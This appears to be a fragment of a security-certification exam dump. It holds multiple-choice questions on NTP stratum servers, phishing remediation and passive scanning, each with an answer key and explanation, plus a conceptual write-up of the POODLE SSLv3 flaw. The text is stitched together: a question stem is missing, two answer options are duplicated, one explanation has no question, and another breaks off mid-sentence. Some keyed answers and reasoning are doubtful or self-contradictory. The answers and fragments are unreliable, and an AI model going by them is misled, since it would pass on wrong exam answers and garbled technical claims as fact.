A. The server should connect to external Stratum 0 NTP servers for synchronization

B. The server should connect to internal Stratum 0 NTP servers for synchronization

C. The server should connect to external Stratum 1 NTP servers for synchronization

D. The server should connect to external Stratum 1 NTP servers for synchronization

Correct Answer: B

Section: (none)

Explanation

Explanation/Reference:

Configure your own Internal NTP hierarchical service for your network. It is possible to purchase Stratum 1 or

Stratum 0 NTP appliances to use internally for less than the cost of a typical server. It is also possible to set up

a private NTP server at a very low cost. The feasibility of setting up a commercial off the shelf (COTS) NTP

server is evidenced in a recent effort to configure a Raspberry Pi computer as a Stratum-1 server. If you do

decide to configure you own, please consider the following best practices:

Standardize to UTC time. Within an enterprise, standardize all systems to coordinated universal time (UTC).

Standardizing to UTC simplifies log correlation within the organization and with external parties no matter what

time zone the device being synchronized is located in.

Securing the network time service. Restrict the commands that can be used on the stratum servers. Do not

allow public queries of the stratum servers. Only allow known networks/hosts to communicate with their

respective stratum servers.

Consider the business need for cryptography. Many administrators try to secure their networks with encrypted

communications and encrypted authentication. I would introduce a note of caution here because although there

are cryptographic services associated with NTP for securing NTP communications, the use of encryption

introduces more sources for problems, such as requiring key management, and it also requires a higher

computational overhead.

Remember Segal's Law. Ideally, it would work to have three or more Stratum 0 or Stratum 1 servers and use

those servers as primary masters. Remember Segal's Law: having two NTP servers makes it hard to know

which one is accurate. Two Stratum 0 servers would provide a more accurate timestamp because they are

using a time source that is considered definitive.

Section: (none)

Explanation

Explanation/Reference:

A flaw was found in the way SSL 3.0 handled padding bytes when decrypting messages encrypted using block

ciphers in cipher block chaining (CBC) mode.

How To Protect your Server Against the POODLE SSLv3 Vulnerability

On October 14th, 2014, a vulnerability in version 3 of the SSL encryption protocol was disclosed. This

vulnerability, dubbed POODLE (Padding Oracle On Downgraded Legacy Encryption), allows an attacker to read

information encrypted with this version of the protocol in plain text using a man-in-the-middle attack.

Although SSLv3 is an older version of the protocol which is mainly obsolete, many pieces of software still fall

back on SSLv3 if better encryption options are not available. More importantly, it is possible for an attacker to

force SSLv3 connections if it is an available alternative for both participants attempting a connection.

The POODLE vulnerability affects any services or clients that make it possible to communicate using SSLv3.

Because this is a flaw with the protocol design, and not an implementation issue, every piece of software that

uses SSLv3 is vulnerable.

To find out more information about the vulnerability, consult the CVE information found at CVE-2014-3566.

What is the POODLE Vulnerability?

The POODLE vulnerability is a weakness in version 3 of the SSL protocol that allows an attacker in a man-inthe-

middle context to decipher the plain text content of an SSLv3 encrypted message.

Who is Affected by this Vulnerability?

This vulnerability affects every piece of software that can be coerced into communicating with SSLv3. This

means that any software that implements a fallback mechanism that includes SSLv3 support is vulnerable and

can be exploited.

Some common pieces of software that may be affected are web browsers, web servers, VPN servers, mail

servers, etc.

How Does It Work?

In short, the POODLE vulnerability exists because the SSLv3 protocol does not adequately check the padding

bytes that are sent with encrypted messages.

Since these cannot be verified by the receiving party, an attacker can replace these and pass them on to the

intended destination. When done in a specific way, the modified payload will potentially be accepted by the

recipient without complaint.

An average of once out of every 256 requests will accepted at the destination, allowing the attacker to decrypt a

single byte. This can be repeated easily in order to progressively decrypt additional bytes. Any attacker able to

repeatedly force a participant to resend data using this protocol can break the encryption in a very short amount

of time.

How Can I Protect Myself?

Actions should be taken to ensure that you are not vulnerable in your roles as both a client and a server. Since

encryption is usually negotiated between clients and servers, it is an issue that involves both parties.

Servers and clients should should take steps to disable SSLv3 support completely. Many applications use

better encryption by default, but implement SSLv3 support as a fallback option. This should be disabled, as a

malicious user can force SSLv3 communication if both participants allow it as an acceptable method.

QUESTION 136

Security administrators attempted corrective action after a phishing attack. Users are still experiencing trouble

logging in, as well as an increase in account lockouts. Users' email contacts are complaining of an increase in

spam and social networking requests. Due to the large number of affected accounts, remediation must be

accomplished quickly. Which of the following actions should be taken FIRST? (Select TWO)

A. Disable the compromised accounts

B. Update WAF rules to block social networks

C. Remove the compromised accounts with all AD groups

D. Change the compromised accounts' passwords

E. Disable the open relay on the email server

F. Enable sender policy framework

Correct Answer: EF

Section: (none)

Explanation

Explanation/Reference:

Sender Policy Framework (SPF) is a simple email-validation system designed to detect email spoofing by

providing a mechanism to allow receiving mail exchangers to check that incoming mail from a domain comes

from a host authorized by that domain's administrators.

n a Small Business Server environment, you may have to prevent your Microsoft Exchange Server-based

server from being used as an open relay SMTP server for unsolicited commercial e-mail messages, or spam.

You may also have to clean up the Exchange server's SMTP queues to delete the unsolicited commercial email

messages. If your Exchange server is being used as an open SMTP relay, you may experience one or

more of the following symptoms:

- The Exchange server cannot deliver outbound SMTP mail to a growing list of e-mail domains.

- Internet browsing is slow from the server and from local area network (LAN) clients.

- Free disk space on the Exchange server in the location of the Exchange information store databases or the

Exchange information store transaction logs is reduced more rapidly than you expect.

- The Microsoft Exchange information store databases spontaneously dismount. You may be able to manually

mount the stores by using Exchange System Manager, but the stores may dismount on their own after they run

for a short time. For more information, click the following article number to view the article in the Microsoft

QUESTION 143

A security analyst is attempting to identify vulnerabilities in a customer's web application without impacting the

system or its data. Which of the following BEST describes the vulnerability scanning concept performed?

A. Aggressive scan

B. Passive scan

C. Non-credentialed scan

D. Compliance scan

Correct Answer: B

Section: (none)

Explanation

Explanation/Reference:

Passive scanning is a method of vulnerability detection that relies on information gleaned from network data

that is captured from a target computer without direct interaction.

Packet sniffing applications can be used for passive scanning to reveal information such as operating system,

known protocols running on non-standard ports and active network applications with known bugs. Passive

scanning may be conducted by a network administrator scanning for security vulnerabilities or by an intruder as

a preliminary to an active attack.

For an intruder, passive scanning's main advantage is that it does not leave a trail that could alert users or

administrators to their activities. For an administrator, the main advantage is that it doesn't risk causing

undesired behavior on the target computer, such as freezes. Because of these advantages, passive scanning

need not be limited to a narrow time frame to minimize risk or disruption, which means that it is likely to return

more information.

Passive scanning does have limitations. It is not as complete in detail as active vulnerability scanning and

cannot detect any applications that are not currently sending out traffic; nor can it distinguish false information

put out for obfuscation.
